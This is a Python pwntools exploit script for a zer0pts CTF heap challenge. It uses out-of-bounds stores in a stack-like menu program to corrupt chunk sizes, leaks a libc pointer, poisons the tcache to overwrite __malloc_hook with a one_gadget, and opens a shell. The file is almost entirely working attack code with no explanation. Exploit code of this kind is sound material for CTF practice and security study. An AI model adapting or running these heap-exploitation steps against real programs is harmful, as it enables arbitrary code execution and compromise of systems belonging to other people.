#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "pwn.ctf.zer0pts.com"
PORT = 9001

DEBUG = False

def push(val):
	if DEBUG:
		log.info("Push: %s" % hex(val))
	r.sendline("1")
	r.sendlineafter(": ", str(val))
	r.recvuntil(">> ")

def pop():
	if DEBUG:
		log.info("Pop")
	r.sendline("2")
	r.recvuntil(">> ")

def store(idx, val):
	if DEBUG:
		log.info("Store %d = %s" % (idx, hex(val)))
	r.sendline("3")
	r.sendlineafter(": ", str(idx))
	r.sendlineafter(": ", str(val))
	r.recvuntil(">> ")

def load(idx):
	r.sendline("4")
	r.sendlineafter(": ", str(idx))
	r.recvuntil("value: ")
	LEAK = r.recvline()
	r.recvuntil(">> ")
	return LEAK

def wipe():
	r.sendline("5")
	r.recvuntil(">> ")

def exploit(r):
	r.recvuntil(">> ")

	for i in range(64):
		push(0x21)
		push(0x0)

	wipe()

	push(10)

	for i in range(4):
		pop()

	store(-2, 0x441)

	wipe()

	push(100)

	for i in range(10):
		pop()

	store(-2, 0x21)

	LO = int(load(-6))
	HI = int(load(-5))

	print hex(LO)
	print hex(HI)
	
	MAIN = (HI << (32)) | LO

	libc.address = MAIN - 96 - 0x10 - libc.symbols["__malloc_hook"]

	log.info("MAIN      : %s" % hex(MAIN))
	log.info("LIBC      : %s" % hex(libc.address))

	wipe()
	push(0x10)
	for i in range(12):
		pop()

	store(8, 0xbeef)

	store(8, (libc.symbols["__malloc_hook"] & 0xffffffff) - 0x100000000)
	store(9, ((libc.symbols["__malloc_hook"] & 0xffffffff00000000) >> 32))


	store(-10, 0x21)

	wipe()

	push(0x10)

	for i in range(4):
		push(i)

	for i in range(12):
		pop()

	# overwrite chunk size to keep fake ptr in tcache
	store(-2, 0x41)

	wipe()

	ONE = libc.address + 0xe6e73

	push((ONE & 0xffffffff)-0x100000000)
	push((ONE & 0xffffffff00000000) >> 32)
	push(2)
	push(3)
	push(4)
	push(5)

	r.interactive()
	
	return

if __name__ == "__main__":
	# e = ELF("./chall")
	libc = ELF("./libc.so.6")
	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		LOCAL = True
		#r = process("./chall")
		r = process("./chall", env={"LD_PRELOAD":"./libc.so.6"})
		print (util.proc.pidof(r))
		pause()
		exploit(r)
